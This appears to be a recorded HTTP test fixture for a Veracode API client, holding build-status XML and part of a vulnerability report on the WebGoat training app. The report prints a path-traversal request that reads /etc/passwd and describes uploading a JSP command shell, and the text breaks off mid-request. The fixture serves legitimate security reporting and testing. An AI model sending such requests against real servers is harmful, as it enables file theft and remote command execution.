---
http_interactions:
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/2.0/getappbuilds.do
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=3D5DCB778D6AB2230F9E2820D7CED0BC; Path=/; Secure
      - JSESSIONID=FF2D702E4595FCAA92D4836E7EFF91E1; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Wed, 06 Jun 2012 16:19:22 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <applicationbuilds xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/2.0/applicationbuilds"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/2.0/applicationbuilds
        https://analysiscenter.veracode.com/resource/2.0/applicationbuilds.xsd" account_id="15834">

        <application app_name="Metamail" app_id="32335" industry_vertical="Other"
        assurance_level="Medium" business_criticality="Medium" origin="Internally
        Developed" modified_date="2012-03-01T09:25:34-05:00" cots="false" business_unit="Not
        Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="2.7" build_id="44902" submitter="Veracode" platform="Solaris"
        lifecycle_stage="Maintenance (only bug fixes)" results_ready="true" policy_name="Veracode
        Transitional Very High" policy_version="1" policy_compliance_status="Did Not
        Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:25:25-05:00"
        published_date_sec="1330611925" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Test Application" app_id="36862" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-06-06T05:57:31-04:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="Build 1" build_id="54431" submitter="Veracode" platform="Not
        Specified" lifecycle_stage="Not Specified" results_ready="false" policy_name="Veracode
        Recommended Medium" policy_version="1" policy_compliance_status="Not Assessed"
        rules_status="Calculating..." grace_period_expired="false" scan_overdue="false"/>

        </application>

        <application app_name="TEst C App" app_id="32491" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-03-02T13:12:55-05:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="First Build" build_id="45241" submitter="Stephen Kapp" platform="Linux"
        lifecycle_stage="Internal or Alpha Testing" results_ready="true" policy_name="Veracode
        Recommended Medium" policy_version="1" policy_compliance_status="Did Not Pass"
        rules_status="Did Not Pass" grace_period_expired="true" scan_overdue="true">

        <analysis_unit analysis_type="Static" published_date="2012-03-02T13:12:51-05:00"
        published_date_sec="1330711971" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Apache" app_id="32346" industry_vertical="Other" assurance_level="High"
        business_criticality="High" origin="Open Source" modified_date="2012-03-01T09:28:29-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="2.2.8" build_id="44918" submitter="Veracode" platform="Solaris"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Pass"
        rules_status="Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:28:27-05:00"
        published_date_sec="1330612107" status="Results Ready"/>

        </build>

        </application>

        <application app_name="PHP Vulnerable Web App (Test)" app_id="32363" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-03-08T13:42:21-05:00" cots="false"
        business_unit="Web Frontend" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="First Build" build_id="44942" submitter="Stephen Kapp" platform="PHP"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Recommended Medium" policy_version="1" policy_compliance_status="Did
        Not Pass" rules_status="Did Not Pass" grace_period_expired="true" scan_overdue="true">

        <analysis_unit analysis_type="Static" published_date="2012-03-02T10:45:56-05:00"
        published_date_sec="1330703156" status="Results Ready"/>

        </build>

        </application>

        <application app_name="phpBB" app_id="32341" industry_vertical="Education"
        assurance_level="High" business_criticality="High" origin="Open Source" modified_date="2012-03-01T09:26:45-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1" build_id="44910" submitter="Veracode" platform="PHP" lifecycle_stage="External
        or Beta Testing" results_ready="true" policy_name="Veracode Transitional Very
        High" policy_version="1" policy_compliance_status="Did Not Pass" rules_status="Did
        Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:43-05:00"
        published_date_sec="1330612003" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Roller" app_id="32337" industry_vertical="Other" assurance_level="High"
        business_criticality="High" origin="Internally Developed" modified_date="2012-03-01T09:25:55-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="3.0" build_id="44904" submitter="Veracode" platform="Java"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Did
        Not Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:25:48-05:00"
        published_date_sec="1330611948" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Lunar Lander" app_id="32342" industry_vertical="Media
        &amp; Entertainment" assurance_level="High" business_criticality="High" origin="Purchased
        Application" modified_date="2012-03-01T09:26:55-05:00" cots="false" business_unit="Not
        Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.0.0" build_id="44913" submitter="Veracode" platform="Android"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Pass"
        rules_status="Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:46-05:00"
        published_date_sec="1330612006" status="Results Ready"/>

        </build>

        </application>

        <application app_name="PHP Vulnerable Web App (Test2)" app_id="32721" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-03-08T13:20:43-05:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="First Build" build_id="45742" submitter="Veracode" platform="PHP"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="false"
        policy_name="Veracode Recommended Medium" policy_version="1" policy_compliance_status="Not
        Assessed" rules_status="Not Assessed" grace_period_expired="false" scan_overdue="true">

        <analysis_unit analysis_type="Static" status="Pre-Scan Success"/>

        </build>

        </application>

        <application app_name="Ajax-Login" app_id="33715" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-03-28T08:17:25-04:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="First build" build_id="47652" submitter="Veracode" platform="Java"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Recommended Medium" policy_version="1" policy_compliance_status="Pass" rules_status="Pass"
        grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-28T08:17:17-04:00"
        published_date_sec="1332937037" status="Results Ready"/>

        </build>

        </application>

        <application app_name="WebGoat" app_id="32338" industry_vertical="Other" assurance_level="Very
        High" business_criticality="Very High" origin="Open Source" modified_date="2012-03-01T10:03:59-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="5.0" build_id="44905" submitter="Veracode" platform="Java"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Transitional Very High" policy_version="1" policy_compliance_status="Did Not
        Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:18-05:00"
        published_date_sec="1330611978" status="Results Ready"/>

        <analysis_unit analysis_type="Dynamic" published_date="2012-03-01T10:03:50-05:00"
        published_date_sec="1330614230" status="Results Ready"/>

        <analysis_unit analysis_type="Manual" published_date="2012-03-01T09:59:14-05:00"
        published_date_sec="1330613954" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Open Web Analytics" app_id="35247" industry_vertical="Security
        Products and Services" assurance_level="High" business_criticality="High"
        origin="Not Specified" modified_date="2012-05-09T09:09:11-04:00" cots="false"
        business_unit="Web Frontend" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.5.3" build_id="50892" submitter="Stephen Kapp" platform="PHP"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="false"
        policy_name="Veracode Recommended High" policy_version="1" policy_compliance_status="Not
        Assessed" rules_status="Not Assessed" grace_period_expired="false" scan_overdue="true">

        <analysis_unit analysis_type="Static" status="Pending Internal Review"/>

        </build>

        </application>

        <application app_name="iGoat" app_id="33136" industry_vertical="Security Products
        and Services" assurance_level="Medium" business_criticality="Medium" origin="Not
        Specified" modified_date="2012-03-30T06:52:44-04:00" cots="false" business_unit="Not
        Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="First Build" build_id="46433" submitter="Veracode" platform="iOS"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Recommended Medium" policy_version="1" policy_compliance_status="Pass" rules_status="Pass"
        grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-30T06:52:35-04:00"
        published_date_sec="1333104755" status="Results Ready"/>

        </build>

        </application>

        <application app_name="HSQLdb" app_id="32345" industry_vertical="Other" assurance_level="High"
        business_criticality="High" origin="Open Source" modified_date="2012-03-01T09:27:58-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.8.0.337" build_id="44917" submitter="Veracode" platform="Java"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Did
        Not Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:27:48-05:00"
        published_date_sec="1330612068" status="Results Ready"/>

        </build>

        </application>

        <application app_name="midpssh-BB" app_id="32339" industry_vertical="Other"
        assurance_level="High" business_criticality="High" origin="Open Source" modified_date="2012-03-01T09:26:25-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.0" build_id="44908" submitter="Veracode" platform="J2ME"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Pass"
        rules_status="Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:21-05:00"
        published_date_sec="1330611981" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Hadoop" app_id="32333" industry_vertical="Other" assurance_level="High"
        business_criticality="High" origin="Open Source" modified_date="2012-03-01T09:25:14-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="0.9.1.0" build_id="44900" submitter="Veracode" platform="Java"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Did
        Not Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:25:05-05:00"
        published_date_sec="1330611905" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Open SSH" app_id="32336" industry_vertical="Other"
        assurance_level="High" business_criticality="High" origin="Open Source" modified_date="2012-03-01T09:25:44-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="3.8.1p1" build_id="44903" submitter="Veracode" platform="Solaris"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Pass"
        rules_status="Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:25:39-05:00"
        published_date_sec="1330611939" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Galleon" app_id="32347" industry_vertical="Manufacturing"
        assurance_level="High" business_criticality="High" origin="Contractor" modified_date="2012-03-01T09:28:39-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.0.0" build_id="44919" submitter="Veracode" platform="ColdFusion"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Did
        Not Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:28:32-05:00"
        published_date_sec="1330612112" status="Results Ready"/>

        </build>

        </application>

        <application app_name="Test C App Preflight" app_id="32503" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-03-02T13:41:13-05:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="Test Build" build_id="45255" submitter="Stephen Kapp" platform="Linux"
        lifecycle_stage="Internal or Alpha Testing" results_ready="false" policy_name="Veracode
        Recommended Medium" policy_version="1" policy_compliance_status="Did Not Pass"
        rules_status="Not Assessed" grace_period_expired="false" scan_overdue="true">

        <analysis_unit analysis_type="Static" status="Pending Internal Review"/>

        </build>

        </application>

        <application app_name="Test Application 3" app_id="36863" industry_vertical="Security
        Products and Services" assurance_level="Medium" business_criticality="Medium"
        origin="Not Specified" modified_date="2012-06-06T06:10:11-04:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="Build 1" build_id="54432" submitter="Veracode" platform="Not
        Specified" lifecycle_stage="Not Specified" results_ready="false" policy_name="Veracode
        Recommended Medium" policy_version="1" policy_compliance_status="Not Assessed"
        rules_status="Calculating..." grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" status="Pre-Scan Success"/>

        </build>

        </application>

        <application app_name="iOS Traveler" app_id="32343" industry_vertical="Business
        Services" assurance_level="High" business_criticality="High" origin="Contractor"
        modified_date="2012-03-01T09:27:27-05:00" cots="false" business_unit="Not
        Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.0.20111103" build_id="44914" submitter="Veracode" platform="iOS"
        lifecycle_stage="Deployed (In production and actively developed)" results_ready="true"
        policy_name="Veracode Transitional Very High" policy_version="1" policy_compliance_status="Did
        Not Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:27:22-05:00"
        published_date_sec="1330612042" status="Results Ready"/>

        </build>

        </application>

        <application app_name="BlogEngine.NET" app_id="32344" industry_vertical="Other"
        assurance_level="High" business_criticality="High" origin="Contractor" modified_date="2012-03-01T09:27:48-05:00"
        cots="false" business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        <build version="1.3.1.0" build_id="44915" submitter="Veracode" platform="Windows"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Transitional Very High" policy_version="1" policy_compliance_status="Did Not
        Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:27:40-05:00"
        published_date_sec="1330612060" status="Results Ready"/>

        </build>

        </application>

        </applicationbuilds>

'
    http_version: 
  recorded_at: Wed, 06 Jun 2012 16:19:23 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/2.0/detailedreport.do?build_id=44905
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=5C0950F82CC347C814ADA2FE387C601D; Path=/; Secure
      - JSESSIONID=CA05907E4DBAD45302B6CF6F4CA86338; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Wed, 06 Jun 2012 16:25:25 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<detailedreport xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
        xmlns=\"https://www.veracode.com/schema/reports/export/1.0\" xsi:schemaLocation=\"https://www.veracode.com/schema/reports/export/1.0
        https://analysiscenter.veracode.com/resource/detailedreport.xsd\" report_format_version=\"1.1\"
        app_name=\"WebGoat\" app_id=\"32338\" first_build_submitted_date=\"2012-02-29
        16:17:16 UTC\" version=\"5.0\" build_id=\"44905\" submitter=\"Veracode\" platform=\"Java\"
        assurance_level=\"5\" business_criticality=\"5\" generation_date=\"2012-06-06
        16:25:25 UTC\" veracode_level=\"VL1\" total_flaws=\"190\" flaws_not_mitigated=\"190\"
        teams=\"\" life_cycle_stage=\"External or Beta Testing\" planned_deployment_date=\"\"
        last_update_time=\"2012-03-01 15:03:51 UTC\" is_latest_build=\"true\" policy_name=\"Veracode
        Transitional Very High\" policy_version=\"1\" policy_compliance_status=\"Did
        Not Pass\" policy_rules_status=\"Did Not Pass\" grace_period_expired=\"true\"
        scan_overdue=\"false\" any_type_scan_due=\"2012-03-01 15:03:50 UTC\" business_owner=\"\"
        business_unit=\"Not Specified\" tags=\"\">\n<static-analysis rating=\"F\"
        score=\"59\" submitted_date=\"2012-02-29 16:16:57 UTC\" published_date=\"2012-03-01
        14:26:18 UTC\" analysis_size_bytes=\"3734905\">\n<modules>\n<module name=\"WebGoat-5.0-with-jsp.war\"
        compiler=\"JAVAC_6\" os=\"Java J2SE 6\" architecture=\"JVM\" score=\"59\"
        numflawssev0=\"0\" numflawssev1=\"0\" numflawssev2=\"14\" numflawssev3=\"136\"
        numflawssev4=\"21\" numflawssev5=\"2\"/>\n</modules>\n</static-analysis>\n<dynamic-analysis
        rating=\"D\" score=\"89\" submitted_date=\"2012-03-01 14:58:22 UTC\" published_date=\"2012-03-01
        15:03:50 UTC\">\n<modules>\n<module name=\"dynamic_analysis\" compiler=\"Unknown\"
        os=\"\" architecture=\"\" score=\"89\" numflawssev0=\"0\" numflawssev1=\"0\"
        numflawssev2=\"0\" numflawssev3=\"10\" numflawssev4=\"1\" numflawssev5=\"1\"
        target_url=\"http://10.10.31.202:8080/webgoat\"/>\n</modules>\n</dynamic-analysis>\n<manual-analysis
        rating=\"D\" score=\"81\" submitted_date=\"2012-03-01 14:59:07 UTC\" published_date=\"2012-03-01
        14:59:14 UTC\">\n<cia_adjustment>0</cia_adjustment>\n<modules>\n<module name=\"manual_analysis\"
        compiler=\"Unknown\" os=\"\" architecture=\"\" score=\"81\" numflawssev0=\"0\"
        numflawssev1=\"0\" numflawssev2=\"0\" numflawssev3=\"2\" numflawssev4=\"0\"
        numflawssev5=\"3\"/>\n</modules>\n</manual-analysis>\n<severity level=\"5\">\n<category
        categoryid=\"1\" categoryname=\"Directory Traversal\" pcirelated=\"true\">\n<desc>\n<para
        text=\"Allowing user input to control paths used in filesystem operations
        may enable an attacker to access or modify otherwise protected system resources
        that would normally be inaccessible to end users.  In some cases, the user-provided
        input may be passed directly to the filesystem operation, or it may be concatenated
        to one or more fixed strings to construct a fully-qualified path.\"/>\n<para
        text=\"When an application improperly cleanses special character sequences
        in user-supplied filenames, a path traversal (or directory traversal) vulnerability
        may occur.  For example, an attacker could specify a filename such as &quot;../../etc/passwd&quot;,
        which resolves to a file outside of the intended directory that the attacker
        would not normally be authorized to view.\"/>\n</desc>\n<recommendations>\n<para
        text=\"Assume all user-supplied input is malicious.  Validate all user-supplied
        input to ensure that it conforms to the expected format, using centralized
        data validation routines when possible.  When using black lists, be sure that
        the sanitizing routine performs a sufficient number of iterations to remove
        all instances of disallowed characters and ensure that the end result is not
        dangerous.\"/>\n</recommendations>\n<cwe cweid=\"22\" cwename=\"Improper Limitation
        of a Pathname to a Restricted Directory ('Path Traversal')\" pcirelated=\"true\">\n<description>\n<text
        text=\"The software, when constructing file or directory names from input,
        does not properly sanitize special character sequences that resolve to a file
        or directory name that is outside of the intended directory or directories.\"/>\n</description>\n<manualflaws>\n<flaw
        severity=\"5\" categoryname=\"Improper Limitation of a Pathname to a Restricted
        Directory ('Path Traversal')\" count=\"1\" issueid=\"272\" module=\"manual_analysis\"
        type=\"\" description=\"The software, when constructing file or directory
        names from input, does not properly sanitize special character sequences that
        resolve to a file or directory name that is outside of the intended directory
        or directories.\" note=\"\" cweid=\"22\" remediationeffort=\"2\" exploitLevel=\"2\"
        categoryid=\"1\" pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33
        UTC\" remediation_status=\"New\" cia_impact=\"ppn\" grace_period_expires=\"\"
        affects_policy_compliance=\"false\" location=\"http://targethost/WebGoat/attack?Screen=306871788&amp;menu=200\"
        cvss=\"9\" capecid=\"6\" exploitdifficulty=\"1\" inputvector=\"File\">\n<exploit_desc>An
        attacker can use this to retrieve the contents of arbitrary files on the server.
        This leads to a full compromise of the application running within the context
        of the server.</exploit_desc>\n<severity_desc>An attacker can retrieve server
        state information that allows a compromise of the security boundaries of the
        application.</severity_desc>\n<remediation_desc>When the set of acceptable
        objects, such as filenames or URLs, is limited or known, create a mapping
        from a set of fixed input values (such as numeric IDs) to the actual filenames
        or URLs, and reject all other inputs.</remediation_desc>\n<appendix>\n<description>undefined</description>\n<screenshot
        format=\"PNG\">\n<data></data>\n</screenshot>\n<code>The
        following HTTP request was used to retrieve the contents of the /etc/passwd
        file:\nPOST /WebGoat/attack?Screen=306871788&amp;menu=200 HTTP/1.1\nHost:
        targethost\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101
        Firefox/9.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
        en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nProxy-Connection:
        keep-alive\nReferer: http://targethost/WebGoat/attack?Screen=306871788&amp;menu=200\nCookie:
        JSESSIONID=7AFA29BB6A5D3E1908F035D1B17BB643\nContent-Type: application/x-www-form-urlencoded\nContent-Length:
        59\n\nFile=../../../../../../../../../etc/passwd&amp;SUBMIT=View+File\n\n\nThe
        response included the contents of the requested file.</code>\n</appendix>\n</flaw>\n</manualflaws>\n</cwe>\n</category>\n<category
        categoryid=\"25\" categoryname=\"Insufficient Input Validation\" pcirelated=\"true\">\n<desc>\n<para
        text=\"Weaknesses in this category are related to an absent or incorrect protection
        mechanism that fails to properly validate input that can affect the control
        flow or data flow of a program.\"/>\n</desc>\n<recommendations>\n<para text=\"Validate
        input from untrusted sources before it is used. The untrusted data sources
        may include HTTP requests, file systems, databases, and any external systems
        that provide data to the application. In the case of HTTP requests, validate
        all parts of the request, including headers, form fields, cookies, and URL
        components that are used to transfer information from the browser to the server
        side application.\"/>\n<para text=\"Duplicate any client-side checks on the
        server side. This should be simple to implement in terms of time and difficulty,
        and will greatly reduce the likelihood of insecure parameter values being
        used in the application.\"/>\n</recommendations>\n<cwe cweid=\"434\" cwename=\"Unrestricted
        Upload of File with Dangerous Type\" pcirelated=\"true\">\n<description>\n<text
        text=\"The software allows the attacker to upload or transfer files of dangerous
        types that can be automatically processed within the product's environment.\"/>\n</description>\n<manualflaws>\n<flaw
        severity=\"5\" categoryname=\"Unrestricted Upload of File with Dangerous Type\"
        count=\"1\" issueid=\"270\" module=\"manual_analysis\" type=\"\" description=\"It
        was possible to use the image upload functionality to upload arbitrary content
        to the web server.\" note=\"\" cweid=\"434\" remediationeffort=\"3\" exploitLevel=\"2\"
        categoryid=\"25\" pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33
        UTC\" remediation_status=\"New\" cia_impact=\"ppp\" grace_period_expires=\"\"
        affects_policy_compliance=\"false\" location=\"http://targethost/WebGoat/attack?Screen=1146227108&amp;menu=1600\"
        cvss=\"9\" capecid=\"10\" exploitdifficulty=\"1\" inputvector=\"myfile\">\n<exploit_desc>By
        sending the HTTP upload request an attacker can provide arbitrary content
        within the POST body and an arbitrary filename. The attacker can then access
        the uploaded file with a web-browser causing the uploaded file to be executed.\n</exploit_desc><severity_desc>If
        an attacker is able to upload arbitrary content to a web accessible directory,
        the potential exists for them to upload executable content with a first request
        and then invoke it with a second request. \nIf successful, command execution
        on the host operating system as the tomcat web server user would be possible.\nStatic
        content could be uploaded to the server and accessed by anonymous Internet
        users. This would allow the application to serve as an illicit fileshare.</severity_desc>\n<remediation_desc>The
        provided filename should not be used in construction of the stored filename
        without strict data validation occurring. Ideally, the user-provided filename
        should be ignored and the stored filename constructed entirely from server-side,
        trusted data. For example, the stored filename can simply be a GUID that is
        an index to meta-data in the database. </remediation_desc>\n<appendix>\n<description>undefined</description>\n<screenshot
        format=\"PNG\">\n<data></data>\n</screenshot>\n<screenshot
        format=\"PNG\">\n<data></data>\n</screenshot>\n<code>The
        following POST request uploaded a jsp based shell that could later be accessed
        at: http://targethost/WebGoat/uploads/cmd.jsp\nThe jsp extension has a handler
        configured within the current web server, causing the jsp code to be interpreted
        and executed.\n\nPOST /WebGoat/attack?Screen=1146227108&amp;menu=1600 HTTP/1.1\nHost:
        targethost\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101
        Firefox/9.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
        en-us,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nProxy-Connection:
        keep-alive\nReferer: http://targethost/WebGoat/attack?Screen=1146227108&amp;menu=1600\nCookie:
        JSESSIONID=13984BA559044E0A4610D4AC31B06B27\nContent-Type: multipart/form-data;
